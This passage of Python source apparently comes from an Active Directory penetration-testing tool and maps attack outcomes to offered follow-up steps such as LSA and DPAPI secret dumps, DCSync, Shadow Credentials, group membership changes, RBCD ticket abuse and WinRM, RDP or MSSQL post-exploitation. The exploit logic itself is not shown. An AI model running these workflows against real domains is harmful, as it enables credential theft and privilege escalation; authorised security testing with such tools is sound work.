        )
        if rodc_followups:
            return rodc_followups

        def _handle_dump_lsa() -> None:
            dump_lsa = getattr(shell, "dump_lsa", None)
            if callable(dump_lsa):
                dump_lsa(
                    domain, exec_username, exec_password, target_sam_or_label, "false"
                )

        def _handle_dump_dpapi() -> None:
            dump_dpapi = getattr(shell, "dump_dpapi", None)
            if callable(dump_dpapi):
                dump_dpapi(
                    domain,
                    exec_username,
                    exec_password,
                    target_sam_or_label,
                    "false",
                )

        followups.extend(
            [
                FollowupAction(
                    key="dump_lsa",
                    title="Dump LSA Secrets",
                    description=f"Attempt an SMB/registry LSA secrets dump on {marked_target}.",
                    handler=_handle_dump_lsa,
                ),
                FollowupAction(
                    key="dump_dpapi",
                    title="Dump DPAPI Secrets",
                    description=f"Attempt a DPAPI credential dump on {marked_target}.",
                    handler=_handle_dump_dpapi,
                ),
            ]
        )
        return followups

    if action == "canpsremote":
        marked_target = mark_sensitive(target_label or target_sam_or_label, "hostname")
        rodc_followups = _build_rodc_host_access_followups(
            shell,
            domain=domain,
            target_domain=target_domain,
            target_computer=target_sam_or_label,
            auth_username=exec_username,
            auth_secret=exec_password,
            auth_mode="host_access",
        )

        def _handle_winrm() -> None:
            ask_for_winrm_access = getattr(shell, "ask_for_winrm_access", None)
            if callable(ask_for_winrm_access):
                ask_for_winrm_access(
                    domain,
                    target_sam_or_label,
                    exec_username,
                    exec_password,
                )

        followups.extend(rodc_followups)
        followups.append(
            FollowupAction(
                key="winrm_post_exploitation",
                title="Open WinRM Access Workflow",
                description=f"Use WinRM access on {marked_target} for host-centric post-exploitation.",
                handler=_handle_winrm,
            )
        )
        return followups

    if action == "canrdp":
        marked_target = mark_sensitive(target_label or target_sam_or_label, "hostname")

        def _handle_rdp() -> None:
            ask_for_rdp_access = getattr(shell, "ask_for_rdp_access", None)
            if callable(ask_for_rdp_access):
                ask_for_rdp_access(
                    domain,
                    target_sam_or_label,
                    exec_username,
                    exec_password,
                )

        followups.append(
            FollowupAction(
                key="rdp_access_workflow",
                title="Open RDP Access Workflow",
                description=f"Use RDP access on {marked_target} for interactive post-exploitation.",
                handler=_handle_rdp,
            )
        )
        return followups

    if action in {"sqlaccess", "sqladmin"}:
        marked_target = mark_sensitive(target_label or target_sam_or_label, "hostname")

        def _handle_mssql() -> None:
            ask_for_mssql_access = getattr(shell, "ask_for_mssql_access", None)
            if callable(ask_for_mssql_access):
                ask_for_mssql_access(
                    domain,
                    target_sam_or_label,
                    exec_username,
                    exec_password,
                )

        def _handle_mssql_impersonate() -> None:
            ask_for_mssql_impersonate = getattr(
                shell, "ask_for_mssql_impersonate", None
            )
            if callable(ask_for_mssql_impersonate):
                ask_for_mssql_impersonate(
                    domain,
                    target_sam_or_label,
                    exec_username,
                    exec_password,
                )

        followups.extend(
            [
                FollowupAction(
                    key="mssql_access_workflow",
                    title="Open MSSQL Access Workflow",
                    description=f"Validate SQL administrative access and post-exploitation options on {marked_target}.",
                    handler=_handle_mssql,
                ),
                FollowupAction(
                    key="mssql_impersonation_workflow",
                    title="Check MSSQL Impersonation",
                    description=f"Check SQL impersonation and OS-level pivot options on {marked_target}.",
                    handler=_handle_mssql_impersonate,
                ),
            ]
        )
        return followups

    if action == "writedacl":
        if kind == "domain":
            marked_domain = mark_sensitive(target_label or target_domain, "domain")

            def _handle_dcsync() -> None:
                ask_for_dcsync = getattr(shell, "ask_for_dcsync", None)
                if callable(ask_for_dcsync):
                    ask_for_dcsync(domain, exec_username, exec_password)
                    return
                dcsync = getattr(shell, "dcsync", None)
                if callable(dcsync):
                    dcsync(domain, exec_username, exec_password)
                    return

            followups.append(
                FollowupAction(
                    key="dcsync",
                    title="DCSync",
                    description=f"Attempt DCSync after granting replication rights on {marked_domain}.",
                    handler=_handle_dcsync,
                )
            )
            return followups

        if kind in {"user", "computer"}:
            marked_target = mark_sensitive(target_label, "user")

            def _handle_shadow_credentials() -> None:
                exploit = getattr(shell, "exploit_generic_all_user", None)
                if callable(exploit):
                    exploit(
                        domain,
                        exec_username,
                        exec_password,
                        target_sam_or_label,
                        target_domain,
                        prompt_for_password_fallback=True,
                        prompt_for_user_privs_after=True,
                    )

            followups.append(
                FollowupAction(
                    key="shadow_credentials",
                    title="Shadow Credentials",
                    description=f"Try Shadow Credentials against {marked_target} after DACL changes.",
                    handler=_handle_shadow_credentials,
                )
            )
            return followups

        if kind == "group":
            marked_target = mark_sensitive(target_sam_or_label or target_label, "user")

            def _handle_addmember() -> None:
                exploit = getattr(shell, "exploit_add_member", None)
                if not callable(exploit):
                    return
                changed_username = Prompt.ask(
                    f"Enter the user you want to add to group {target_sam_or_label}",
                    default=exec_username,
                )
                changed_username = strip_sensitive_markers(changed_username).strip()
                exploit(
                    domain,
                    exec_username,
                    exec_password,
                    target_sam_or_label,
                    changed_username,
                    target_domain,
                    enumerate_aces_after=True,
                )

            followups.append(
                FollowupAction(
                    key="addmember",
                    title="Add member",
                    description=f"Add a user to group {marked_target} after applying DACL changes.",
                    handler=_handle_addmember,
                )
            )
            return followups

    if action == "writeowner" and kind in {"user", "group"}:
        marked_target = mark_sensitive(target_label, "user")

        def _handle_writedacl() -> None:
            exploit = getattr(shell, "exploit_write_dacl", None)
            if callable(exploit):
                exploit(
                    domain,
                    exec_username,
                    exec_password,
                    target_sam_or_label,
                    target_domain,
                    kind,
                    followup_after=True,
                )

        followups.append(
            FollowupAction(
                key="writedacl",
                title="WriteDacl",
                description=f"Attempt WriteDacl against {marked_target} after becoming owner.",
                handler=_handle_writedacl,
            )
        )

    return followups


def build_followups_for_execution_outcome(
    shell: Any,
    *,
    outcome: dict[str, Any],
) -> list[FollowupAction]:
    """Return follow-up actions derived from the runtime outcome of a step."""
    outcome_key = str(outcome.get("key") or "").strip().lower()
    if outcome_key == "user_credential_obtained":
        target_domain = str(
            outcome.get("target_domain") or outcome.get("domain") or ""
        ).strip()
        compromised_user = strip_sensitive_markers(
            str(outcome.get("compromised_user") or "")
        ).strip()
        credential = str(outcome.get("credential") or "").strip()
        if not target_domain or not compromised_user or not credential:
            return []
        return _build_user_credential_followups(
            shell,
            domain=target_domain,
            username=compromised_user,
            credential=credential,
        )

    rodc_access_context = parse_rodc_host_access_outcome(outcome)
    if outcome_key in {"rbcd_prepared", "rodc_host_access_prepared"}:
        target_domain = str(
            outcome.get("target_domain") or outcome.get("domain") or ""
        ).strip()
        target_computer = strip_sensitive_markers(
            str(outcome.get("target_computer") or "")
        ).strip()
        attacker_machine = strip_sensitive_markers(
            str(outcome.get("attacker_machine") or "")
        ).strip()
        target_spn = strip_sensitive_markers(
            str(outcome.get("target_spn") or "")
        ).strip()
        http_target_spn = strip_sensitive_markers(
            str(outcome.get("http_target_spn") or "")
        ).strip()
        delegated_user = strip_sensitive_markers(
            str(outcome.get("delegated_user") or "")
        ).strip()
        ticket_path = strip_sensitive_markers(
            str(outcome.get("ticket_path") or "")
        ).strip()
        http_ticket_path = strip_sensitive_markers(
            str(outcome.get("http_ticket_path") or "")
        ).strip()
        if rodc_access_context is not None:
            target_domain = rodc_access_context.target_domain
            target_computer = rodc_access_context.target_computer
        access_source = str(outcome.get("access_source") or "").strip().lower()
        is_rbcd_like = outcome_key == "rbcd_prepared" or access_source == "rbcd"
        if is_rbcd_like and (
            not target_domain
            or not target_computer
            or not attacker_machine
            or not target_spn
        ):
            return []
        if not is_rbcd_like and (not target_domain or not target_computer):
            return []

        marked_target = mark_sensitive(target_computer, "user")
        followups: list[FollowupAction] = []
        if is_rbcd_like:
            if (
                target_spn.lower().startswith("cifs/")
                and delegated_user
                and ticket_path
            ):
                rodc_followups = _build_rodc_host_access_followups(
                    shell,
                    domain=str(outcome.get("domain") or ""),
                    target_domain=target_domain,
                    target_computer=target_computer,
                    auth_username=delegated_user,
                    auth_secret=ticket_path,
                    auth_mode="rbcd_ticket",
                    access_source="rbcd",
                    attacker_machine=attacker_machine,
                    target_spn=target_spn,
                    delegated_user=delegated_user,
                    ticket_path=ticket_path,
                    http_ticket_path=http_ticket_path or None,
                )
                if rodc_followups:
                    return rodc_followups

            marked_attacker = mark_sensitive(attacker_machine, "user")
            marked_spn = mark_sensitive(target_spn, "service")
            followups.append(
                FollowupAction(
                    key="review_rbcd_ticket",
                    title="Review Delegated Ticket Context",
                    description=(
                        f"Review the prepared RBCD context for {marked_target}: "
                        f"{marked_attacker} now has a delegated path toward {marked_spn}."
                    ),
                    handler=lambda: _render_rbcd_prepared_context(
                        domain=str(outcome.get("domain") or ""),
                        target_domain=target_domain,
                        target_computer=target_computer,
                        attacker_machine=attacker_machine,
                        target_spn=target_spn,
                        delegated_user=delegated_user or None,
                        ticket_path=ticket_path or None,
                        http_target_spn=http_target_spn or None,
                        http_ticket_path=http_ticket_path or None,
                    ),
                )
            )
            if (
                target_spn.lower().startswith("cifs/")
                and delegated_user
                and ticket_path
            ):
                followups.append(
                    FollowupAction(
                        key="dump_lsa_via_rbcd",
                        title="Dump LSA Secrets",
                        description=(
                            f"Use the delegated CIFS ticket for {mark_sensitive(delegated_user, 'user')} "
                            f"to attempt an LSA dump on {marked_target}."
                        ),
                        handler=lambda: _run_rbcd_lsa_followup(
                            shell,
                            domain=str(outcome.get("domain") or ""),
                            target_domain=target_domain,
                            target_computer=target_computer,
                            delegated_user=delegated_user,
                            ticket_path=ticket_path,
                        ),
                    )
                )
                followups.append(
                    FollowupAction(
                        key="dump_dpapi_via_rbcd",
                        title="Dump DPAPI Secrets",
                        description=(
                            f"Use the delegated CIFS ticket for {mark_sensitive(delegated_user, 'user')} "
                            f"to attempt a DPAPI dump on {marked_target}."
                        ),
                        handler=lambda: _run_rbcd_dpapi_followup(
                            shell,
                            domain=str(outcome.get("domain") or ""),
                            target_domain=target_domain,
                            target_computer=target_computer,
                            delegated_user=delegated_user,
                            ticket_path=ticket_path,
                        ),
                    )
                )
            return followups

        if rodc_access_context is not None and resolve_rodc_followup_plan_from_context(
            shell,
            context=rodc_access_context,
        ):
            followups.extend(
                _build_rodc_host_access_followups(
                    shell,
                    domain=rodc_access_context.domain,
                    target_domain=rodc_access_context.target_domain,
                    target_computer=rodc_access_context.target_computer,
                    auth_username=rodc_access_context.auth_username,
                    auth_secret=rodc_access_context.auth_secret,
                    auth_mode=rodc_access_context.auth_mode,
                    access_source=rodc_access_context.access_source,
                    attacker_machine=rodc_access_context.attacker_machine,
                    target_spn=rodc_access_context.target_spn,
                    delegated_user=rodc_access_context.delegated_user,
                    ticket_path=rodc_access_context.ticket_path,
                )
            )
        return followups

    if outcome_key != "group_membership_changed":
        return []

    target_domain = str(
        outcome.get("target_domain") or outcome.get("domain") or ""
    ).strip()
    added_user = strip_sensitive_markers(str(outcome.get("added_user") or "")).strip()
    target_group = str(outcome.get("target_group") or "").strip()
    if not target_domain or not added_user or not target_group:
        return []

    credential = _resolve_domain_credential(
        shell,
        domain=target_domain,
        username=added_user,
    )
    exec_username = str(outcome.get("exec_username") or "").strip()
    exec_password = str(outcome.get("exec_password") or "").strip()
    if (
        not credential
        and exec_password
        and _normalize_account(exec_username) == _normalize_account(added_user)
    ):
        credential = exec_password
    marked_user = mark_sensitive(added_user, "user")
    marked_group = mark_sensitive(target_group, "group")
    marked_domain = mark_sensitive(target_domain, "domain")

    if not credential:
        print_info_debug(
            "[followup] group-membership outcome has no stored credential: "
            f"user={marked_user} group={marked_group} domain={marked_domain}"
        )
        return []

    return [
        FollowupAction(
            key="refresh_ticket",
            title="Refresh Kerberos Ticket",
            description=(
                f"Refresh the Kerberos ticket for {marked_user} so subsequent checks "
                f"use the new membership in {marked_group}."
            ),
            handler=lambda: _refresh_group_membership_ticket(
                shell,
                domain=target_domain,
                added_user=added_user,
                credential=credential,
            ),
        ),
        FollowupAction(
            key="enumerate_host_access",
            title="Check New Host Access",
            description=(
                f"Probe SMB/WinRM/RDP/MSSQL access for {marked_user} after joining "
                f"{marked_group}."
            ),
            handler=lambda: _run_user_host_access_followup(
                shell,
                domain=target_domain,
                username=added_user,
                credential=credential,
            ),
        ),
        FollowupAction(
            key="enumerate_shares",
            title="Enumerate SMB Shares",
            description=(
                f"Enumerate authenticated SMB shares now reachable by {marked_user} "
                f"via {marked_group}."
            ),
            handler=lambda: _run_user_share_followup(
                shell,
                domain=target_domain,
                username=added_user,
                credential=credential,
            ),
        ),
    ]


def render_followup_actions_panel(
    *,
    step_action: str,
    target_label: str,
    followups: list[FollowupAction],
) -> None:
    """Render a follow-up action list as a panel."""
    table = Table(
        title=Text("Recommended follow-ups", style=f"bold {BRAND_COLORS['info']}"),
        show_header=True,
        header_style=f"bold {BRAND_COLORS['info']}",
        show_lines=True,
    )
    table.add_column("#", style="dim", width=4, justify="right")
    table.add_column("Action", style="bold")
    table.add_column("Description", style="dim", overflow="fold")

    for idx, item in enumerate(followups, start=1):
        table.add_row(str(idx), item.title, item.description)

    title = Text("Follow-up Actions", style=f"bold {BRAND_COLORS['info']}")
    marked_step = mark_sensitive(step_action, "node")
    marked_target = mark_sensitive(target_label, "node")
    subtitle = Text.assemble(
        ("Step: ", "dim"),
        (str(marked_step), "bold"),
        ("  Target: ", "dim"),
        (str(marked_target), "bold"),
    )
    print_panel(
        [subtitle, table], title=title, border_style=BRAND_COLORS["info"], expand=False
    )
